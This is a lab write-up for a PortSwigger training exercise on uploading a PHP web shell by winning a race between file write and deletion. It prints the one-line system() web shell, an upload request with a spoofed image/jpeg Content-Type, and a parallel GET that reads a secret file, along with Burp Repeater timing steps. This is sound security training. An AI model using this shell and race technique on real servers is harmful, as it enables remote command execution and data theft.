# Lab 07 — Web shell upload via race condition

**Difficulty:** 🔴 Expert  
**Technique:** File Upload — race condition between file write and file deletion  
**Link:** https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

---

## Concept

The server processes uploads in this order:

```php
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file); // 1. write to disk
if (checkViruses($target_file) && checkFileType($target_file)) { // 2. validate
    echo "uploaded";
} else {
    unlink($target_file);                                         // 3. delete if invalid
}
```

The file lands on disk **before** validation runs. There is a window between step 1 and step 3 where the file exists and is accessible. The attack sends a GET to the file during that window — the server returns the file's output before it gets deleted.

The extension check (`checkFileType`) would normally block `.php`, but it runs after the file is already written — so the rejection comes too late if the GET wins the race.

---

## Process

### Step 1 — Prepare the web shell

```
<?php echo system($_GET['command']); ?>
```

### Step 2 — Capture the upload POST in Burp and send to Repeater

Intercept the avatar upload POST and forward it to Repeater. Change the `Content-Type` of the file part to `image/jpeg` so the request reaches `move_uploaded_file` without being blocked earlier in the pipeline:

```
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/jpeg

<?php echo system($_GET['command']); ?>
```

### Step 3 — Prepare the GET in a second Repeater tab

```
GET /files/avatars/shell.php?command=cat+/home/carlos/secret HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: session=<session>
```

### Step 4 — Group the tabs and send in parallel

In Burp Repeater, add both tabs to the same group. Set send mode to **"Send group (parallel)"** and force **HTTP/1.1** (HTTP/2 causes stream errors in Burp Community). Send the group.

The POST returns **403** — the server validated, detected `.php`, and deleted the file. The GET returns **200** — it reached the file during the window between write and delete.

Secret retrieved from the GET response.

---

## Issues encountered

- Trying to upload with the original `Content-Type: application/x-php` — the server blocked the request before reaching `move_uploaded_file`, so the file never landed on disk and the race had no window to exploit. Fix: spoof Content-Type to `image/jpeg`.
- Attempting null byte (`shell.php%00.jpg`) as filename — unnecessary here and adds complexity. The race condition doesn't require bypassing the extension check, just winning the timing window before deletion.

---

## Takeaways

- The vulnerability is in the **order of operations**: write first, validate later — that sequence creates the exploitable window
- A 403 on the POST + 200 on the GET is the expected outcome — the 403 confirms the file was deleted, but the GET already won the race
- Spoofing Content-Type to `image/jpeg` is necessary to get past any early MIME check before `move_uploaded_file` runs
- HTTP/1.1 required in Burp Community — HTTP/2 causes stream errors that break parallel sending
- No need for Turbo Intruder for this lab — Repeater's "Send group (parallel)" is sufficient

---

## References

- [File Upload Vulnerabilities — PortSwigger](https://portswigger.net/web-security/file-upload)
- [Race Conditions — PortSwigger](https://portswigger.net/web-security/race-conditions)
